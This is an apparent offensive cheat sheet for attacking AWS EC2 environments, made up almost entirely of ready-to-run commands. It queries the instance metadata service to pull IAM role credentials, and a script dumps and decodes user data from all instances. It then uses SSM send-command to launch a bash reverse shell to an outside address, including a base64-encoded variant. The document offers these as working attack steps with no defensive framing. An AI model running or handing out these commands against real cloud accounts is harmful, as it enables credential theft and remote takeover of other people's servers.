___
Exploit misconfigurations in EC2 metadata, SSM, or user-data to gain code execution or extract credentials.
### Instance Metadata Service (IMDS) Enumeration
---
IMDSv1 (Unauthenticated Requests)
```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/instance-type
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/security-groups
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```
If a role is attached and has broad permissions (e.g., `AllowEC2ToReadSecrets`), you can retrieve secrets directly:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets
```
IMDSv2 (Token-Based Access)
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets
```
### EC2 User Data Enumeration
---
Pull user data from all instances:
```bash
# userDataEnum.sh
#!/bin/bash

instance_ids=$(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text)
for instance_id in $instance_ids; do
    echo "Getting userData for instance: $instance_id"
    user_data=$(aws ec2 describe-instance-attribute \
        --instance-id "$instance_id" \
        --attribute userData --output text 2>/dev/null)
    if [ -n "$user_data" ]; then
        # Strip "USERDATA" prefix, then base64-decode
        user_data=$(echo "$user_data" | sed 's/^USERDATAs*//' | sed '1d' | sed 's/^[[:space:]]*//')
        echo "Base64-encoded userData for $instance_id:"
        echo "$user_data"
        echo "Decoded userData for $instance_id:"
        echo "$user_data" | base64 -d
    else
        echo "No userData for $instance_id"
    fi
    echo "-----------------------------------------"
done

```
### AWS Systems Manager (SSM) Command Execution
---
Check for SSM perms
```bash
aws iam list-attached-user-policies --user-name <USERNAME>
```
If you find a policy ARN such as `AllowSSMRunShellCommands`, retrieve its document:
```bash
aws iam get-policy --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/AllowSSMRunShellCommands
aws iam get-policy-version \
  --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/AllowSSMRunShellCommands \
  --version-id v1
```
Look for `"ssm:SendCommand"` in the document’s `"Statement"` and note which targets (e.g., `"Resource": ["arn:aws:ec2:us-east-1:<ACCOUNT_ID>:instance/i-0abcd1234"]`) are allowed.
Send a Command via SSM (Assuming Permissions Exist)
```bash
aws ssm send-command \
  --instance-ids "i-0abcd1234" \
  --document-name "AWS-RunShellScript" \
  --comment "ReverseShell" \
  --parameters '{"commands":["bash -c \'bash -i >& /dev/tcp/10.0.10.100/8443 0>&1\'"]}' \
  --output text
```
If you need to base64-encode the payload to avoid shell‐quoting issues:
```bash
PAYLOAD=$(echo "bash -i >& /dev/tcp/10.0.10.100/8443 0>&1" | base64)
aws ssm send-command \
  --instance-ids "i-0abcd1234" \
  --document-name "AWS-RunShellScript" \
  --comment "ReverseShell" \
  --parameters "{\"commands\":[\"echo $PAYLOAD | base64 -d | bash\"]}" \
  --output text
```
Debug a Failed SSM Invocation:
```bash
aws ssm list-command-invocations \
  --instance-id "i-0abcd1234" \
  --command-id "cb542971-efb0-4f08-9281-9ca010a4c0ef" \
  --details
```
